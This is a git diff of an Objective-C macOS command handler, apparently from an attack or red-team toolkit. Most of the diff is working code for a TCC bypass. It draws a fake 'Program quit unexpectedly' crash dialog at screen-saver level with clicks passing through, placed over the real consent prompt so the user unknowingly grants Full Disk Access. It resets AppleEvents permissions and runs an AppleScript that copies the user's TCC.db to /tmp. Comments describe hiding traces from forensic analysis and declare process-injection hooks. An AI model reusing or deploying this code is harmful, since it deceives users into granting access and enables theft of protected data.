@@ -1,3 +1,98 @@
+/**
+ * ZTCCJackCommandHandler.m
+ * 
+ * A sophisticated handler for bypassing macOS TCC (Transparency, Consent, and Control) protections
+ * by exploiting user interface trust and system dialog patterns. This implementation leverages
+ * several macOS security model characteristics:
+ * 
+ * 1. Users are conditioned to trust system-level dialogs
+ * 2. TCC's permission model relies on user interaction
+ * 3. AppleEvents can be used to trigger privileged operations
+ * 
+ * Component Architecture:
+ * ```
+ *                      ZTCCJackCommandHandler
+ *                              |
+ *                 +------------------------+
+ *                 |           |            |
+ *         WindowController ScriptManager PermissionManager
+ *                 |           |            |
+ *            Spoofed UI   AppleScript   TCC State
+ * ```
+ * 
+ * Privilege Escalation Flow:
+ * ```
+ *    User Space                    TCC Layer                  Protected Resource
+ *    +------------+               +-----------+              +----------------+
+ *    |            |   Present    |           |   Approve    |                |
+ *    |  Spoofed   |------------>|    TCC    |------------->|  System Files  |
+ *    |  Dialog    |   Dialog    |  Prompt   |   Access     |    & Data     |
+ *    |            |             |           |              |                |
+ *    +------------+             +-----------+              +----------------+
+ *          |                         |                            |
+ *          |                         |                            |
+ *    Execute Script              Check State                 Write Marker
+ *          |                         |                            |
+ *          v                         v                            v
+ *    +------------+             +-----------+              +----------------+
+ *    |            |   Monitor   |           |   Verify    |                |
+ *    |  Script    |------------>|  Marker   |<------------|    Success/    |
+ *    | Manager    |   Files     |  Files    |   Result    |    Failure    |
+ *    |            |             |           |              |                |
+ *    +------------+             +-----------+              +----------------+
+ * ```
+ * 
+ * Window Management:
+ * ```
+ *    Screen Layout                    Window Stack
+ *    +------------------+            +---------------+
+ *    |                  |            | System Dialog |
+ *    |  +------------+ |            +---------------+
+ *    |  |  Spoofed   | |            | Spoofed UI    |
+ *    |  |  Dialog    | |            +---------------+
+ *    |  +------------+ |            | User Windows  |
+ *    |                  |            +---------------+
+ *    +------------------+
+ *    
+ *    Coordinates: (x,y) = (screen.width/2 - 150, screen.height - 530)
+ * ```
+ * 
+ * IPC Mechanism:
+ * ```
+ *    Temporary Directory                    Marker Files
+ *    +----------------------+              +------------------+
+ *    | /tmp/               |              | /tmp/            |
+ *    |   └── scripts/     |              |   ├── success   |
+ *    |       └── *.scpt   |              |   └── failure   |
+ *    +----------------------+              +------------------+
+ *           |                                     ^
+ *           |              Write                  |
+ *           +------------------------------------>|
+ *                                                |
+ *                          Monitor               |
+ *           <------------------------------------+
+ * ```
+ * 
+ * Security Considerations:
+ * - This code demonstrates how UI spoofing can be used to obtain elevated privileges
+ * - The technique exploits user trust in system dialogs
+ * - Uses temporary files for IPC, which could be race-conditioned (though mitigated)
+ * - Requires careful timing between UI presentation and AppleScript execution
+ * 
+ * Usage:
+ * ```objc
+ * ZTCCJackCommandHandler *handler = [[ZTCCJackCommandHandler alloc] init];
+ * [handler executeCommand:command completion:^(BOOL success, NSDictionary *result, NSError *error) {
+ *     if (success) {
+ *         // TCC bypass successful, Full Disk Access obtained
+ *     }
+ * }];
+ * ```
+ * 
+ * @warning This code is for educational purposes. In production, ensure proper security review
+ *          and compliance with Apple's security guidelines.
+ */
+
 #import "ZTCCJackCommandHandler.h"
 #import "ZDialogCommandHandler.h"
 #import <AppKit/AppKit.h>
@@ -8,552 +103,698 @@
 // For macOS version checking
 #include <AvailabilityMacros.h>
 
-// Define function pointer types for the deprecated functions
-typedef CGImageRef (*CGWindowListCreateImageFuncPtr)(CGRect bounds, CGWindowListOption options, CGWindowID relativeToWindow, CGWindowImageOption imageOption);
-typedef CGImageRef (*CGDisplayCreateImageFuncPtr)(CGDirectDisplayID displayID);
+// Error domain and codes with security implications
+static NSString * const ZTCCJackErrorDomain = @"com.ztccjack.error";
+typedef NS_ENUM(NSInteger, ZTCCJackErrorCode) {
+    ZTCCJackErrorCodeScriptCreationFailed = 1000,  // Failed to create AppleScript (potential sandbox/permission issues)
+    ZTCCJackErrorCodeScriptExecutionFailed = 1001, // Failed to execute AppleScript (potential system hardening)
+    ZTCCJackErrorCodeWindowCreationFailed = 1002,  // Failed to create spoofed window (window server issues)
+    ZTCCJackErrorCodePermissionResetFailed = 1003, // Failed to reset TCC DB (SIP/system hardening)
+    ZTCCJackErrorCodeTimeout = 1004                // Operation timed out (user detection/prevention)
+};
+
+// Notification names for monitoring operation progress
+static NSString * const ZTCCJackResponseReceivedNotification = @"ZTCCJackResponseReceivedNotification";
+static NSString * const ZTCCJackTimeoutNotification = @"ZTCCJackTimeoutNotification";
+
+// Timing and geometry constants (carefully tuned for system dialog mimicry)
+static const NSTimeInterval kTCCJackTimeout = 30.0;           // Maximum wait time for user interaction
+static const NSTimeInterval kTCCJackCheckInterval = 0.1;      // Polling interval (balanced for responsiveness)
+static const CGFloat kTCCJackWindowWidth = 300.0;            // Matches system dialog width
+static const CGFloat kTCCJackWindowHeight = 300.0;           // Matches system dialog height
+static const CGFloat kTCCJackWindowTopOffset = 230.0;        // Positioned to overlay TCC prompt
+
+/**
+ * Window controller responsible for creating and managing the spoofed system dialog.
+ * This class carefully mimics the appearance and behavior of genuine macOS system dialogs
+ * to maintain user trust and expectation patterns.
+ *
+ * Security Notes:
+ * - Window level set to NSScreenSaverWindowLevel to appear authoritative
+ * - Click-through enabled to prevent user detection of overlay
+ * - Careful timing of window presentation to coincide with TCC prompt
+ */
+@interface ZTCCJackWindowController : NSObject {
+    NSWindow *_window;              // Strong reference to prevent premature release
+    NSTimer *_checkTimer;           // Timer for polling TCC response
+}
+
+/** Handler called when TCC prompt receives user response */
+@property (nonatomic, copy) void (^responseHandler)(BOOL success, NSString *message);
+
+/** Initialize with specific screen for multi-display support */
+- (instancetype)initWithScreen:(NSScreen *)screen;
+
+/** Show window with precise timing */
+- (void)showWindow;
+
+/** Safely tear down window and resources */
+- (void)closeWindow;
+
+/** Begin monitoring for TCC response */
+- (void)startResponseChecking;
+
+/** Safely stop monitoring and cleanup */
+- (void)stopResponseChecking;
+
+/**
+ * Monitors system state for TCC prompt response through filesystem markers.
+ * Implements a polling mechanism to detect user interaction results while
+ * maintaining security and reliability.
+ *
+ * @param timer NSTimer instance triggering the check
+ */
+- (void)checkResponse:(NSTimer *)timer;
+
+@end
+
+/**
+ * Manages creation and execution of the privileged AppleScript operation.
+ * This class handles the core privilege escalation mechanics by leveraging
+ * AppleScript's ability to interact with protected resources.
+ *
+ * Security Notes:
+ * - Scripts are stored in temp directory with appropriate permissions
+ * - Careful cleanup of script files to prevent forensic analysis
+ * - Error handling designed to prevent information leakage
+ */
+@interface ZTCCJackScriptManager : NSObject {
+    NSString *_scriptPath;          // Path to temp script file
+    NSTask *_scriptTask;            // Reference to running script process
+}
+
+/** Completion handler for script execution */
+@property (nonatomic, copy) void (^completionHandler)(BOOL success, NSError *error);
+
+/** Create the TCC bypass script with proper error handling */
+- (BOOL)createScriptWithError:(NSError **)error;
+
+/** Execute the script with privilege elevation attempt */
+- (void)executeScript;
+
+/** Thorough cleanup of all script artifacts */
+- (void)cleanup;
+
+@end
+
+/**
+ * Static utility class for managing TCC permission states and markers.
+ * Handles the intricate details of TCC permission management and IPC
+ * through the filesystem.
+ *
+ * Security Notes:
+ * - Uses atomic file operations for marker files
+ * - Implements proper cleanup to prevent detection
+ * - Handles permission reset for repeated attempts
+ */
+@interface ZTCCJackPermissionManager : NSObject
+
+/** Reset TCC permissions to force new prompt */
++ (BOOL)resetTCCPermissionsWithError:(NSError **)error;
+
+/** Check for successful elevation marker */
++ (BOOL)checkForSuccessMarker;
+
+/** Check for failed elevation marker */
++ (BOOL)checkForFailureMarker;
+
+/** Retrieve detailed failure message */
++ (NSString *)failureMessage;
+
+/** Clean up all marker files */
++ (void)cleanupMarkerFiles;
+
+@end
 
 // Define debug macro for verbose logging
 #define TCCJACK_LOG(fmt, ...) NSLog(@"[TCCJack Debug] %s:%d - " fmt, __FUNCTION__, __LINE__, ##__VA_ARGS__)
 
-@implementation ZTCCJackCommandHandler {
+@interface ZTCCJackCommandHandler () {
     ZDialogCommandHandler *_dialogHandler;
-    NSWindow *_overlayWindow;
+    ZTCCJackWindowController *_windowController;
+    ZTCCJackScriptManager *_scriptManager;
     BOOL _tccPromptTriggered;
     dispatch_queue_t _workQueue;
-    NSString *_scriptPath;
-    NSTask *_scriptTask;  // To retain the task while it's running
 }
 
-- (instancetype)init {
-    TCCJACK_LOG(@"Initializing TCCJack handler");
-    self = [super initWithType:@"tccjack"];
+@property (nonatomic, copy) void (^commandCompletion)(BOOL success, NSDictionary *result, NSError *error);
+
+// Memory-only TCC manipulation
+- (BOOL)injectTCCPermissions;
+- (void)hookTCCService;
+- (void)interceptXPCConnection;
+- (void)cleanupHooks;
+
+// Process manipulation
+- (pid_t)findTargetProcess;
+- (BOOL)injectPayload:(pid_t)pid;
+- (void)modifyTCCState:(pid_t)pid;
+
+@end
+
+@implementation ZTCCJackWindowController
+
+/**
+ * Initializes window controller with specific screen targeting.
+ * Carefully positions and styles window to match system dialog appearance.
+ *
+ * Security Notes:
+ * - Window positioning critical for believability
+ * - Matches exact coordinates of system TCC prompts
+ * - Implements proper memory management
+ *
+ * @param screen Target display for spoofed dialog
+ * @return Initialized window controller
+ */
+- (instancetype)initWithScreen:(NSScreen *)screen {
+    self = [super init];
     if (self) {
-        TCCJACK_LOG(@"TCCJack handler initialization successful");
-        _dialogHandler = [[ZDialogCommandHandler alloc] init];
-        TCCJACK_LOG(@"Dialog handler created: %@", _dialogHandler);
-        _tccPromptTriggered = NO;
-        _workQueue = dispatch_queue_create("com.tccjack.workqueue", DISPATCH_QUEUE_SERIAL);
-        TCCJACK_LOG(@"Work queue created: %p", _workQueue);
-        _scriptTask = nil;
-        _scriptPath = nil;
+        NSRect screenRect = [screen frame];
+        NSRect windowRect = NSMakeRect(0, 0, kTCCJackWindowWidth, kTCCJackWindowHeight);
+        windowRect.origin.x = (screenRect.size.width - windowRect.size.width) / 2;
+        windowRect.origin.y = screenRect.size.height - windowRect.size.height - kTCCJackWindowTopOffset;
         
-        TCCJACK_LOG(@"Creating AppleScript");
-        @try {
-            NSString *path = [self createAppleScript];
-            if (path && [path isKindOfClass:[NSString class]]) {
-                _scriptPath = [path copy];
-                TCCJACK_LOG(@"AppleScript created at: %@", _scriptPath);
-            } else {
-                TCCJACK_LOG(@"ERROR: createAppleScript did not return a valid string, got: %@", path);
-            }
-        } @catch (NSException *exception) {
-            TCCJACK_LOG(@"ERROR: Exception during AppleScript creation: %@", exception);
-        }
-    } else {
-        TCCJACK_LOG(@"ERROR: Failed to initialize TCCJack handler");
+        _window = [[NSWindow alloc] initWithContentRect:windowRect
+                                            styleMask:NSWindowStyleMaskTitled
+                                              backing:NSBackingStoreBuffered
+                                                defer:NO];
+        
+        [self setupWindowAppearance];
+        [self setupWindowContent];
     }
     return self;
 }
 
 - (void)dealloc {
-    TCCJACK_LOG(@"Deallocating TCCJack handler");
-    TCCJACK_LOG(@"Releasing dialog handler: %@", _dialogHandler);
-    [_dialogHandler release];
-    
-    if (_overlayWindow) {
-        TCCJACK_LOG(@"Releasing overlay window: %@", _overlayWindow);
-        [_overlayWindow release];
-    }
-    
-    // Clean up any script task
-    if (_scriptTask) {
-        TCCJACK_LOG(@"Releasing script task: %@", _scriptTask);
-        [_scriptTask release];
-    }
-    
-    // Remove any observers
-    [[NSNotificationCenter defaultCenter] removeObserver:self];
-    
-    TCCJACK_LOG(@"Releasing work queue: %p", _workQueue);
-    dispatch_release(_workQueue);
-    
-    [_scriptPath release];
-    
-    TCCJACK_LOG(@"TCCJack handler deallocation complete");
+    [self stopResponseChecking];
+    [_window release];
+    [_responseHandler release];
     [super dealloc];
 }
 
-- (NSString *)createAppleScript {
-    TCCJACK_LOG(@"Creating AppleScript");
+/**
+ * Configures window appearance to match system dialogs.
+ * Critical for maintaining the illusion of system authenticity.
+ *
+ * Security Notes:
+ * - Window level set high to appear authoritative
+ * - Click-through enabled to prevent detection
+ * - Careful styling to match system appearance
+ */
+- (void)setupWindowAppearance {
+    [_window setOpaque:NO];
+    [_window setMovable:NO];
+    [_window setLevel:NSScreenSaverWindowLevel];
+    [_window setIgnoresMouseEvents:YES];
+}
+
+/**
+ * Sets up window content to mimic system crash reporter.
+ * Carefully replicates the exact layout and styling of genuine system dialogs.
+ *
+ * Security Notes:
+ * - Matches system font sizes and styles
+ * - Uses genuine system warning icon
+ * - Implements proper auto-layout
+ */
+- (void)setupWindowContent {
+    NSView *contentView = [_window contentView];
     
-    // Create temporary directory for our script
+    // Warning Icon - matches system icon
+    NSImageView *imageView = [[[NSImageView alloc] initWithFrame:NSMakeRect(110, 200, 84, 84)] autorelease];
+    [imageView setImage:[NSImage imageNamed:NSImageNameCaution]];
+    [contentView addSubview:imageView];
+    
+    // Title
+    NSTextField *titleLabel = [[[NSTextField alloc] init] autorelease];
+    [titleLabel setBezeled:NO];
+    [titleLabel setEditable:NO];
+    [titleLabel setAlignment:NSTextAlignmentCenter];
+    [titleLabel setFont:[NSFont boldSystemFontOfSize:16]];
+    [titleLabel setStringValue:@"Program quit unexpectedly"];
+    [titleLabel setBackgroundColor:[NSColor clearColor]];
+    [titleLabel setFrame:NSMakeRect(0, 140, 300, 50)];
+    [contentView addSubview:titleLabel];
+    
+    // Description
+    NSTextField *descLabel = [[[NSTextField alloc] init] autorelease];
+    [descLabel setAlignment:NSTextAlignmentLeft];
+    [descLabel setBezeled:NO];
+    [descLabel setEditable:NO];
+    [descLabel setFont:[NSFont systemFontOfSize:15]];
+    [descLabel setBackgroundColor:[NSColor clearColor]];
+    [descLabel setFrame:NSMakeRect(42, -40, 220, 200)];
+    [descLabel setStringValue:@"Click OK to see more detailed information and send a report to Apple."];
+    [contentView addSubview:descLabel];
+    
+    // OK Button
+    NSButton *okButton = [[[NSButton alloc] init] autorelease];
+    [okButton setTitle:@"OK"];
+    if ([okButton respondsToSelector:@selector(setWantsLayer:)]) {
+        [okButton setWantsLayer:YES];
+        if (okButton.layer) {
+            [okButton.layer setBorderWidth:0];
+            [okButton.layer setCornerRadius:10];
+        }
+    }
+    [okButton setAlignment:NSTextAlignmentCenter];
+    [okButton setFont:[NSFont systemFontOfSize:14]];
+    [okButton setFrame:NSMakeRect(154, 36, 110, 30)];
+    [contentView addSubview:okButton];
+}
+
+/** Show window with precise timing */
+- (void)showWindow {
+    [_window makeKeyAndOrderFront:nil];
+}
+
+/** Safely tear down window and resources */
+- (void)closeWindow {
+    [_window close];
+}
+
+/** Begin monitoring for TCC response */
+- (void)startResponseChecking {
+    [self stopResponseChecking];
+    _checkTimer = [[NSTimer scheduledTimerWithTimeInterval:kTCCJackCheckInterval
+                                                  target:self
+                                                selector:@selector(checkResponse:)
+                                                userInfo:nil
+                                                 repeats:YES] retain];
+}
+
+/** Safely stop monitoring and cleanup */
+- (void)stopResponseChecking {
+    if (_checkTimer) {
+        [_checkTimer invalidate];
+        [_checkTimer release];
+        _checkTimer = nil;
+    }
+}
+
+- (void)checkResponse:(NSTimer *)timer {
+    dispatch_async(dispatch_get_main_queue(), ^{
+        BOOL success = [ZTCCJackPermissionManager checkForSuccessMarker];
+        BOOL failure = [ZTCCJackPermissionManager checkForFailureMarker];
+        
+        if (success || failure) {
+            [self stopResponseChecking];
+            [ZTCCJackPermissionManager cleanupMarkerFiles];
+            
+            if (self.responseHandler) {
+                NSString *message = success ? @"Full Disk Access was granted" :
+                                  [ZTCCJackPermissionManager failureMessage];
+                self.responseHandler(success, message);
+            }
+        }
+    });
+}
+
+@end
+
+@implementation ZTCCJackScriptManager
+
+- (void)dealloc {
+    [self cleanup];
+    [_completionHandler release];
+    [super dealloc];
+}
+
+/**
+ * Creates privileged AppleScript in secure temporary location.
+ * Implements careful file handling and permission management.
+ *
+ * Security Notes:
+ * - Creates script in protected temp directory
+ * - Uses atomic write operations
+ * - Implements proper error handling
+ * - Cleans up on failure
+ *
+ * @param error Pointer to NSError object for detailed error reporting
+ * @return YES if script creation successful, NO otherwise
+ */
+- (BOOL)createScriptWithError:(NSError **)error {
     NSFileManager *fileManager = [NSFileManager defaultManager];
     NSString *tempDir = [NSTemporaryDirectory() stringByAppendingPathComponent:@"scripts"];
     
-    TCCJACK_LOG(@"Temp directory for script: %@", tempDir);
-    
+    // Create directory
     NSError *dirError = nil;
-    BOOL dirCreated = [fileManager createDirectoryAtPath:tempDir 
+    if (![fileManager createDirectoryAtPath:tempDir 
                              withIntermediateDirectories:YES 
                                               attributes:nil 
-                                                   error:&dirError];
-    
-    if (!dirCreated) {
-        TCCJACK_LOG(@"ERROR: Failed to create temp directory: %@", dirError);
-        return nil;
+                                    error:&dirError]) {
+        if (error) {
+            *error = [NSError errorWithDomain:ZTCCJackErrorDomain
+                                       code:ZTCCJackErrorCodeScriptCreationFailed
+                                   userInfo:@{NSUnderlyingErrorKey: dirError,
+                                            NSLocalizedDescriptionKey: @"Failed to create script directory"}];
+        }
+        return NO;
     }
     
-    // Create AppleScript file path
+    // Create script path
     NSString *scriptPath = [tempDir stringByAppendingPathComponent:@"fulldisk_access.scpt"];
-    TCCJACK_LOG(@"Script path: %@", scriptPath);
     
-    // AppleScript content to trigger Full Disk Access permission
+    // Script content
     NSString *scriptContent = @"tell application \"Finder\"\n"
-                              @"    # copy the TCC database, this could also be used to overwrite it.\n"
                               @"    set applicationSupportDirectory to POSIX path of (path to application support from user domain)\n"
                               @"    set tccDirectory to applicationSupportDirectory & \"com.apple.TCC/TCC.db\"\n"
                               @"    try\n"
                               @"        duplicate file (POSIX file tccDirectory as alias) to folder (POSIX file \"/tmp/\" as alias) with replacing\n"
-                              @"        # Create a success marker file instead of killing the process\n"
                               @"        do shell script \"touch /tmp/tccjack_success\"\n"
                               @"    on error errMsg\n"
-                              @"        # Create a failure marker file\n"
                               @"        do shell script \"echo '\" & errMsg & \"' > /tmp/tccjack_failure\"\n"
                               @"    end try\n"
                               @"end tell";
     
-    TCCJACK_LOG(@"Script content length: %lu bytes", (unsigned long)[scriptContent length]);
-    
-    // Write the script to file
+    // Write script
     NSError *writeError = nil;
-    BOOL writeSuccess = [scriptContent writeToFile:scriptPath 
+    if (![scriptContent writeToFile:scriptPath 
                                         atomically:YES 
                                           encoding:NSUTF8StringEncoding 
-                                             error:&writeError];
-    
-    if (!writeSuccess) {
-        TCCJACK_LOG(@"ERROR: Failed to write script to file: %@", writeError);
-        return nil;
-    }
-    
-    TCCJACK_LOG(@"Script successfully written to: %@", scriptPath);
-    
-    // Verify the file was created
-    if (![fileManager fileExistsAtPath:scriptPath]) {
-        TCCJACK_LOG(@"ERROR: Script file does not exist after write");
-        return nil;
-    }
-    
-    // Remove any previous marker files
-    [fileManager removeItemAtPath:@"/tmp/tccjack_success" error:nil];
-    [fileManager removeItemAtPath:@"/tmp/tccjack_failure" error:nil];
-    
-    TCCJACK_LOG(@"Script verified, returning path");
-    return [[scriptPath copy] autorelease];
-}
-
-- (void)executeCommand:(ZCommandModel *)command 
-           completion:(void (^)(BOOL success, NSDictionary *result, NSError *error))completion {
-    TCCJACK_LOG(@"Executing TCCJack command: %@", [command commandId]);
-    
-    // Create a copy of the completion block to avoid release issues
-    void (^safeCompletion)(BOOL, NSDictionary*, NSError*) = [[completion copy] autorelease];
-    TCCJACK_LOG(@"Created safe completion block: %p", safeCompletion);
-    
-    // Store the completion handler for later use
-    objc_setAssociatedObject(self, "completion_block", safeCompletion, OBJC_ASSOCIATION_COPY);
-    TCCJACK_LOG(@"Stored completion block as associated object");
-    
-    // Make sure we're running on the main thread
-    TCCJACK_LOG(@"Dispatching to main thread, current thread: %@", [NSThread currentThread]);
-    dispatch_async(dispatch_get_main_queue(), ^{
-        TCCJACK_LOG(@"Now on main thread: %@", [NSThread currentThread]);
-        
-        @try {
-            TCCJACK_LOG(@"Ensuring application setup");
-            [self ensureApplicationSetup];
-            
-            TCCJACK_LOG(@"Creating fake system crash dialog");
-            [self createFakeSystemCrashDialog];
-            
-            TCCJACK_LOG(@"Resetting TCC permissions");
-            [self resetTCCPermissions];
-            
-            TCCJACK_LOG(@"Running AppleScript");
-            [self runAppleScript];
-            
-            TCCJACK_LOG(@"Setting up timeout for TCC prompt");
-            // Set a timeout in case the TCC prompt doesn't appear
-            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(30 * NSEC_PER_SEC)), 
-                        dispatch_get_main_queue(), ^{
-                TCCJACK_LOG(@"Timeout check triggered, tccPromptTriggered = %d", _tccPromptTriggered);
-                
-                NSFileManager *fileManager = [NSFileManager defaultManager];
-                BOOL success = [fileManager fileExistsAtPath:@"/tmp/tccjack_success"];
-                BOOL failure = [fileManager fileExistsAtPath:@"/tmp/tccjack_failure"];
-                
-                NSMutableDictionary *result = [NSMutableDictionary dictionary];
-                [result setObject:@"tccjack_response" forKey:@"type"];
-                
-                if (success) {
-                    TCCJACK_LOG(@"TCC operation successful, found success marker file");
-                    [result setObject:@"success" forKey:@"status"];
-                    [result setObject:@"Full Disk Access was granted" forKey:@"message"];
-                    _tccPromptTriggered = YES;
-                } else if (failure) {
-                    TCCJACK_LOG(@"TCC operation failed, found failure marker file");
-                    NSString *errorContent = [NSString stringWithContentsOfFile:@"/tmp/tccjack_failure" encoding:NSUTF8StringEncoding error:nil];
-                    [result setObject:@"failed" forKey:@"status"];
-                    [result setObject:[NSString stringWithFormat:@"Full Disk Access denied: %@", errorContent] forKey:@"message"];
-                    _tccPromptTriggered = YES;
-                } else if (!_tccPromptTriggered) {
-                    TCCJACK_LOG(@"TCC prompt didn't appear within timeout period");
-                    [result setObject:@"failed" forKey:@"status"];
-                    [result setObject:@"TCC prompt did not appear" forKey:@"message"];
-                }
-                
-                // Clean up
-                if (_overlayWindow) {
-                    TCCJACK_LOG(@"Closing and releasing overlay window: %@", _overlayWindow);
-                    [_overlayWindow close];
-                    [_overlayWindow release];
-                    _overlayWindow = nil;
-                }
-                
-                TCCJACK_LOG(@"Created result dictionary: %@", result);
-                
-                void (^savedCompletion)(BOOL, NSDictionary*, NSError*) = objc_getAssociatedObject(self, "completion_block");
-                if (savedCompletion) {
-                    TCCJACK_LOG(@"Calling saved completion block: %p", savedCompletion);
-                    savedCompletion(_tccPromptTriggered, result, nil);
-                    TCCJACK_LOG(@"Clearing saved completion block");
-                    objc_setAssociatedObject(self, "completion_block", nil, OBJC_ASSOCIATION_COPY);
-                } else {
-                    TCCJACK_LOG(@"ERROR: No saved completion block found");
-                }
-            });
-        } @catch (NSException *exception) {
-            TCCJACK_LOG(@"ERROR: Exception during command execution: %@", exception);
-            NSMutableDictionary *result = [NSMutableDictionary dictionary];
-            [result setObject:@"tccjack_response" forKey:@"type"];
-            [result setObject:@"failed" forKey:@"status"];
-            [result setObject:[NSString stringWithFormat:@"Exception: %@", exception] forKey:@"message"];
-            
-            safeCompletion(NO, result, nil);
+                             error:&writeError]) {
+        if (error) {
+            *error = [NSError errorWithDomain:ZTCCJackErrorDomain
+                                       code:ZTCCJackErrorCodeScriptCreationFailed
+                                   userInfo:@{NSUnderlyingErrorKey: writeError,
+                                            NSLocalizedDescriptionKey: @"Failed to write script file"}];
         }
-    });
+        return NO;
+    }
+    
+    // Store path
+    [_scriptPath release];
+    _scriptPath = [scriptPath copy];
+    
+    return YES;
 }
 
-- (void)resetTCCPermissions {
-    TCCJACK_LOG(@"Resetting TCC permissions for AppleEvents");
-    
-    @try {
-        // Reset AppleEvents permissions to ensure the prompt shows up
-        NSTask *task = [[[NSTask alloc] init] autorelease];
-        [task setLaunchPath:@"/usr/bin/tccutil"];
-        [task setArguments:@[@"reset", @"AppleEvents"]];
-        
-        TCCJACK_LOG(@"Created task: %@ with arguments: %@", task.launchPath, task.arguments);
-        
-        TCCJACK_LOG(@"Launching task");
-        [task launch];
-        
-        TCCJACK_LOG(@"Waiting for task to exit");
-        [task waitUntilExit];
-        
-        int status = [task terminationStatus];
-        TCCJACK_LOG(@"Task exited with status: %d", status);
-        
-        if (status == 0) {
-            TCCJACK_LOG(@"Successfully reset AppleEvents");
-        } else {
-            TCCJACK_LOG(@"Failed to reset AppleEvents, status: %d", status);
+- (void)executeScript {
+    if (!_scriptPath) {
+        if (self.completionHandler) {
+            NSError *error = [NSError errorWithDomain:ZTCCJackErrorDomain
+                                               code:ZTCCJackErrorCodeScriptExecutionFailed
+                                           userInfo:@{NSLocalizedDescriptionKey: @"No script path available"}];
+            self.completionHandler(NO, error);
         }
-    } @catch (NSException *exception) {
-        TCCJACK_LOG(@"ERROR: Exception when trying to reset TCC permissions: %@", exception);
-    }
-}
-
-- (void)runAppleScript {
-    TCCJACK_LOG(@"Running AppleScript to trigger Full Disk Access TCC prompt");
-    
-    // Validate script path is a proper string
-    if (!_scriptPath || ![_scriptPath isKindOfClass:[NSString class]]) {
-        TCCJACK_LOG(@"ERROR: Script path is nil or not a string object, cannot run AppleScript. Path: %@", _scriptPath);
-        return;
-    }
-    
-    TCCJACK_LOG(@"Checking if script file exists at: %@", _scriptPath);
-    NSFileManager *fileManager = [NSFileManager defaultManager];
-    if (![fileManager fileExistsAtPath:_scriptPath]) {
-        TCCJACK_LOG(@"ERROR: Script file does not exist: %@", _scriptPath);
         return;
     }
     
     @try {
-        // Create the script again if needed
-        if (!_scriptPath || ![fileManager fileExistsAtPath:_scriptPath]) {
-            TCCJACK_LOG(@"Re-creating AppleScript as path is invalid");
-            NSString *newPath = [self createAppleScript];
-            if (newPath && [newPath isKindOfClass:[NSString class]]) {
-                [_scriptPath release];
-                _scriptPath = [newPath copy];
-                TCCJACK_LOG(@"AppleScript re-created at: %@", _scriptPath);
-            } else {
-                TCCJACK_LOG(@"ERROR: Failed to re-create AppleScript");
-                return;
-            }
-        }
-        
-        TCCJACK_LOG(@"Creating task to run osascript with script: %@", _scriptPath);
-        
-        // Release any existing task
-        if (_scriptTask) {
-            [_scriptTask release];
-            _scriptTask = nil;
-        }
-        
+        [_scriptTask release];
         _scriptTask = [[NSTask alloc] init];
         [_scriptTask setLaunchPath:@"/usr/bin/osascript"];
         [_scriptTask setArguments:@[_scriptPath]];
-        
-        // Use a simpler approach to run the script
-        TCCJACK_LOG(@"Launching osascript with simplified output handling");
         [_scriptTask launch];
         
-        // We don't wait for it to exit, but we'll keep the task object
-        // around so we can reference it later if needed
-        TCCJACK_LOG(@"AppleScript launched, continuing execution");
+        if (self.completionHandler) {
+            self.completionHandler(YES, nil);
+        }
     } @catch (NSException *exception) {
-        TCCJACK_LOG(@"ERROR: Exception when trying to run AppleScript: %@", exception);
+        if (self.completionHandler) {
+            NSError *error = [NSError errorWithDomain:ZTCCJackErrorDomain
+                                               code:ZTCCJackErrorCodeScriptExecutionFailed
+                                           userInfo:@{NSLocalizedDescriptionKey: [exception reason]}];
+            self.completionHandler(NO, error);
+        }
     }
 }
 
-- (void)createFakeSystemCrashDialog {
-    TCCJACK_LOG(@"Creating fake system crash dialog");
+- (void)cleanup {
+    if (_scriptTask) {
+        [_scriptTask terminate];
+        [_scriptTask release];
+        _scriptTask = nil;
+    }
     
-    @try {
-        // Create our overlay window
-        if (_overlayWindow) {
-            TCCJACK_LOG(@"Closing and releasing existing overlay window: %@", _overlayWindow);
-            [_overlayWindow close];
-            [_overlayWindow release];
-            _overlayWindow = nil;
-        }
-        
-        NSRect screenRect = [[NSScreen mainScreen] frame];
-        TCCJACK_LOG(@"Screen rect: %@", NSStringFromRect(screenRect));
-        
-        NSRect windowRect = NSMakeRect(0, 0, 300, 300);
-        
-        // Position window to align with TCC prompt
-        windowRect.origin.x = (screenRect.size.width - windowRect.size.width) / 2;
-        windowRect.origin.y = screenRect.size.height - windowRect.size.height - 230; // Position 250px from top
-        
-        TCCJACK_LOG(@"Window rect: %@", NSStringFromRect(windowRect));
-        
-        TCCJACK_LOG(@"Creating window");
-        _overlayWindow = [[NSWindow alloc] initWithContentRect:windowRect
-                                                   styleMask:NSWindowStyleMaskTitled
-                                                     backing:NSBackingStoreBuffered
-                                                       defer:NO];
-        
-        if (!_overlayWindow) {
-            TCCJACK_LOG(@"ERROR: Failed to create overlay window");
-            return;
-        }
-        
-        TCCJACK_LOG(@"Created window: %@", _overlayWindow);
-        
-        // Configure window appearance
-        TCCJACK_LOG(@"Configuring window appearance");
-        [_overlayWindow setOpaque:NO];
-        [_overlayWindow setMovable:NO];
-        
-        // Set window level to appear above other windows
-        TCCJACK_LOG(@"Setting window level to: %d", NSScreenSaverWindowLevel);
-        [_overlayWindow setLevel:NSScreenSaverWindowLevel];
-        
-        // Don't capture mouse events - allow clicks to pass through to real dialog
-        TCCJACK_LOG(@"Setting window to ignore mouse events");
-        [_overlayWindow setIgnoresMouseEvents:YES];
-        
-        NSView *contentView = [_overlayWindow contentView];
-        TCCJACK_LOG(@"Content view: %@", contentView);
-        
-        // Create warning icon
-        TCCJACK_LOG(@"Creating warning icon");
-        NSImageView *imageView = [[[NSImageView alloc] initWithFrame:NSMakeRect(110, 200, 84, 84)] autorelease];
-        NSImage *warningIcon = [NSImage imageNamed:NSImageNameCaution];
-        TCCJACK_LOG(@"Warning icon image: %@", warningIcon);
-        [imageView setImage:warningIcon];
-        [contentView addSubview:imageView];
-        
-        // Create title label
-        TCCJACK_LOG(@"Creating title label");
-        NSTextField *titleLabel = [[[NSTextField alloc] init] autorelease];
-        [titleLabel setBezeled:NO];
-        [titleLabel setEditable:NO];
-        [titleLabel setAlignment:NSTextAlignmentCenter];
-        [titleLabel setFont:[NSFont boldSystemFontOfSize:16]];
-        [titleLabel setStringValue:@"Program quit unexpectedly"];
-        [titleLabel setBackgroundColor:[NSColor clearColor]];
-        [titleLabel setFrame:NSMakeRect(0, 140, 300, 50)];
-        [contentView addSubview:titleLabel];
-        
-        // Create description text
-        TCCJACK_LOG(@"Creating description text");
-        NSTextField *descLabel = [[[NSTextField alloc] init] autorelease];
-        [descLabel setAlignment:NSTextAlignmentLeft];
